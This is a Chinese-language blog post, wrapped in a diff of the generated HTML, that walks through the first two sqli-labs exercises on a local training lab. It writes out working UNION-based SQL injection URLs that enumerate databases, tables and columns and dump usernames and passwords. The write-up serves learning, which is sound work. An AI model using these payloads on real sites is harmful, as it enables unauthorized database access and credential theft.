@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  
+  
+  <title>
+    sqlilab的第一题（基于错误的GET单引号字符型注入）和第二题 |
+    
+    Hexo
+  </title>
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+    
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<script src="/js/pace.min.js"></script>
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+  <main class="content">
+    <section class="outer">
+  <article id="post-sqlilab的第一题（基于错误的GET单引号字符型注入）和第二题" class="article article-type-post" itemscope
+  itemprop="blogPost" data-scroll-reveal>
+
+  <div class="article-inner">
+    
+    <header class="article-header">
+      
+
+<h1 class="article-title" itemprop="name">
+  sqlilab的第一题（基于错误的GET单引号字符型注入）和第二题
+</h1>
+
+
+
+    </header>
+    
+
+    
+    <div class="article-meta">
+      <a href="/2021/10/12/sqlilab%E7%9A%84%E7%AC%AC%E4%B8%80%E9%A2%98%EF%BC%88%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84GET%E5%8D%95%E5%BC%95%E5%8F%B7%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5%EF%BC%89%E5%92%8C%E7%AC%AC%E4%BA%8C%E9%A2%98/" class="article-date">
+  <time datetime="2021-10-12T14:17:34.000Z" itemprop="datePublished">2021-10-12</time>
+</a>
+      
+    </div>
+    
+
+    
+    
+<div class="tocbot"></div>
+
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+      
+      
+      <h1 id="sqlilab的第一题（基于错误的GET单引号字符型注入）和第二题"><a href="#sqlilab的第一题（基于错误的GET单引号字符型注入）和第二题" class="headerlink" title="sqlilab的第一题（基于错误的GET单引号字符型注入）和第二题"></a>sqlilab的第一题（基于错误的GET单引号字符型注入）和第二题</h1><h3 id="什么是sql注入"><a href="#什么是sql注入" class="headerlink" title="什么是sql注入"></a>什么是sql注入</h3><p>　　SQL注入是比较常见的网络攻击方式之一，它不是利用操作系统的BUG来实现攻击，而是针对程序员编写时的疏忽，通过SQL语句，实现无账号登录，甚至篡改数据库</p>
+<span id="more"></span>
+
+<p><strong>SQL注入攻击的总体思路</strong>　</p>
+<p>　　1：寻找到SQL注入的位置</p>
+<p>　　2：判断服务器类型和后台数据库类型</p>
+<p>　　3：针对不同的服务器和数据库特点进行SQL注入攻击</p>
+<h3 id="sqlilab第一题做题思路"><a href="#sqlilab第一题做题思路" class="headerlink" title="sqlilab第一题做题思路"></a>sqlilab第一题做题思路</h3><p>首先</p>
+<p><img src="D:\博客\source\img\b1.png"></p>
+<p>1.我根据题目提示，输入<code>http://127.0.0.1/sqli-labs-master/Less-1/?id=1</code>显示正常<img src="C:\Users\夜风\AppData\Roaming\Typora\typora-user-images\image-20211012222641068.png" alt="image-20211012222641068"></p>
+<p>2.加个单引号看看，<code>http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#39;</code>显示出错</p>
+<p><img src="C:\Users\夜风\AppData\Roaming\Typora\typora-user-images\image-20211012222857912.png" alt="image-20211012222857912"></p>
+<p>3后通过<code>http://127.0.0.1/sqli-labs-master/Less-1/?id=1 and 1=2</code></p>
+<p><img src="C:\Users\夜风\AppData\Roaming\Typora\typora-user-images\image-20211012223103655.png" alt="image-20211012223103655"></p>
+<p><code>http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#39; and &#39;1&#39; = &#39;2</code></p>
+<p><img src="C:\Users\夜风\AppData\Roaming\Typora\typora-user-images\image-20211012223203726.png" alt="image-20211012223203726"></p>
+<p>可以得知给sql注入为单引号字符型注入</p>
+<p>4.现在可以构造语句，来获得mysql中的数据</p>
+<p>首先先了解相关的数据库知识</p>
+<p>information_schema，系统数据库，包含所有数据库相关信息。</p>
+<p>information_schema.schemata中schema_name列，字段为所有数据库名称。</p>
+<p><img src="C:\Users\夜风\AppData\Roaming\Typora\typora-user-images\image-20211012223755050.png" alt="image-20211012223755050"></p>
+<p>information_schema.tables中table_name列对应数据库所有表名，其中table_schema列是所有数据库名。</p>
+<p><img src="C:\Users\夜风\AppData\Roaming\Typora\typora-user-images\image-20211012224020829.png" alt="image-20211012224020829"></p>
+<p>information_schema.columns中，column_name列对应所有列名，其中table_schema列也对应所有数据库名，table_name列也对应所有表名。</p>
+<p><img src="C:\Users\夜风\AppData\Roaming\Typora\typora-user-images\image-20211012224105268.png" alt="image-20211012224105268"></p>
+<ol>
+<li>使用order by查列数，order by语法为：ORDER BY column1 [ASC|DESC], column2 [ASC|DESC],… 此处以数字1,2,3…指定以某一列为key进行排序，通过尝试得出列数,得出列数为3。</li>
+</ol>
+<ul>
+<li>order by 3时，<code>http://localhost:8088/sqlilabs/Less-1/?id=1&#39; order by 3 --+</code>，正常：</li>
+</ul>
+<p><img src="C:\Users\夜风\AppData\Roaming\Typora\typora-user-images\image-20211012224248458.png" alt="image-20211012224248458"></p>
+<p>order by 4时，<code>http://localhost:8088/sqlilabs/Less-1/?id=1&#39; order by 4 --+</code>，错误</p>
+<p><img src="C:\Users\夜风\AppData\Roaming\Typora\typora-user-images\image-20211012224402868.png" alt="image-20211012224402868"></p>
+<p>由此我可以得出给数据库有三列</p>
+<p>6.接着进行联合注入，通过回显爆出表名，列名，字段，用户名和密码。</p>
+<p>7.爆数据库名:<code>http://localhost:8088/sqlilabs/Less-1/?id=-1&#39; union select 1,group_concat(schema_name),3 from information_schema.schemata --+</code></p>
+<p>（为什么id = -1，是因为当id = -1时查询为假就会导致前面的查询结构为空集，这样才会导致后面的查询结果显示出来）（id = 0或其他的都行，只要让前面的查询为空集就行）</p>
+<p><img src="C:\Users\夜风\AppData\Roaming\Typora\typora-user-images\image-20211012231732881.png" alt="image-20211012231732881"></p>
+<p>显示出当前数据库名<code>http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#39; union select 1,2,database() --+</code></p>
+<p><img src="C:\Users\夜风\AppData\Roaming\Typora\typora-user-images\image-20211012232117447.png" alt="image-20211012232117447"></p>
+<p>爆当前security数据库的表:<code>http://localhost:8088/sqlilabs/Less-1/?id=-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39;--+</code></p>
+<p><img src="C:\Users\夜风\AppData\Roaming\Typora\typora-user-images\image-20211012233416153.png" alt="image-20211012233416153"></p>
+<p>爆user表的列:<code>http://localhost:8088/sqlilabs/Less-1/?id=-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39; --+</code></p>
+<p><img src="C:\Users\夜风\AppData\Roaming\Typora\typora-user-images\image-20211012233847019.png" alt="image-20211012233847019"></p>
+<p>爆所有用户名和密码: <code>http://localhost:8088/sqlilabs/Less-1/?id=-1&#39; union select 1,group_concat(concat_ws(&#39;:&#39;,username,password)),3 from users --+</code></p>
+<p>或<code>http://localhost:8088/sqlilabs/Less-1/?id=-1&#39; union select 1,group_concat(username),group_concat(password) from users --+</code></p>
+<p><img src="C:\Users\夜风\AppData\Roaming\Typora\typora-user-images\image-20211012234032297.png" alt="image-20211012234032297"></p>
+<p>结束</p>
+<h3 id="做题过程中的各种知识"><a href="#做题过程中的各种知识" class="headerlink" title="做题过程中的各种知识"></a>做题过程中的各种知识</h3><ol>
+<li>在mysql数据库中，单行注释有<code>#</code>和<code>--</code>，在实际操作中<code>#</code>号一般用<code>%23</code>来表示。而<code>--</code>则用<code>--+</code>来表示。因为在URL中，如果在最后加上<code>--</code> ，浏览器在发送请求的时候会把URL末尾的空格舍去，而用<code>--+</code>代替<code>--</code>，原因是<code>+</code>在URL被URL编码后会变成空格。</li>
+<li>与数据库相关的内容：</li>
+</ol>
+<ul>
+<li>information_schema，系统数据库，包含所有数据库相关信息。</li>
+<li>information_schema.schemata中schema_name列，字段为所有数据库名称。</li>
+<li>information_schema.tables中table_name列对应数据库所有表名，其中table_schema列是所有数据库名。</li>
+<li>information_schema.columns中，column_name列对应所有列名，其中table_schema列也对应所有数据库名，table_name列也对应所有表名。</li>
+</ul>
+<ol>
+<li>联合查询时需要将前面的查询结果限定为空集，后面的查询结果才能显示出来。</li>
+<li><a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=https://baijiahao.baidu.com/s?id=1595349117525189591&wfr=spider&for=pc">concat(),concat_ws()与及group_concat()的用法</a></li>
+</ol>
+<p>sqlilab的第二题</p>
+<p>从开始通过前面的办法判断出sql注入为数字型注入</p>
+<p>其他与前面一样</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/10/12/sqlilab%E7%9A%84%E7%AC%AC%E4%B8%80%E9%A2%98%EF%BC%88%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84GET%E5%8D%95%E5%BC%95%E5%8F%B7%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5%EF%BC%89%E5%92%8C%E7%AC%AC%E4%BA%8C%E9%A2%98/" data-id="ckutams5j0004v8tc6gia3iq8" class="article-share-link">
+        Share
+      </a>
+      
+<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li></ul>
+
+    </footer>
+
+  </div>
+
+  
+  
+<nav class="article-nav">
+  
+  
+  <a href="/2021/10/11/mysql%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/" class="article-nav-link">
+    <strong class="article-nav-caption">Older</strong>
+    <div class="article-nav-title">mysql的增删改查</div>
+  </a>
+  
+</nav>
+
+  
+
+  
+  
+  
+  
+
+</article>
+</section>
+    <footer class="footer">
+  <div class="outer">
+    <div class="float-right">
+      <ul class="list-inline">
+  
+  <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
+  
+  <li><i class="fe fe-bookmark"></i> <span id="busuanzi_value_page_pv"></span></li>
+  
+</ul>
+    </div>
+    <ul class="list-inline">
+      <li>Hexo &copy; 2021</li>
+      
+        <li>ZHWANGART</li>
+      
+      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
+      <li>theme  <a target="_blank" rel="noopener" href="https://github.com/zhwangart/hexo-theme-ocean">Ocean</a></li>
+    </ul>
+  </div>
+</footer>
+  </main>
+  <aside class="sidebar">
+    <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/hexo.svg" alt="Hexo"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">Home</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">Archives</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/gallery">Gallery</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about">About</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link nav-item-search" title="Search">
+        <i class="fe fe-search"></i>
+        Search
+      </a>
+    </li>
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      <div class="totop" id="totop">
+  <i class="fe fe-rocket"></i>
+</div>
+    </li>
+    <li class="nav-item">
+      
+      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+        <i class="fe fe-feed"></i>
+      </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+  </aside>
+  
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/copybtn.js"></script>
+
+
+
+
+
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
+  tocbot.init({
+    tocSelector: '.tocbot',
+    contentSelector: '.article-entry',
+    headingSelector: 'h1, h2, h3, h4, h5, h6',
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    positionFixedSelector: '.tocbot',
+    positionFixedClass: 'is-position-fixed',
+    fixedSidebarOffset: 'auto',
+  });
+</script>
+
+
+
+<script src="/js/ocean.js"></script>
+
+</body>
+
+</html>
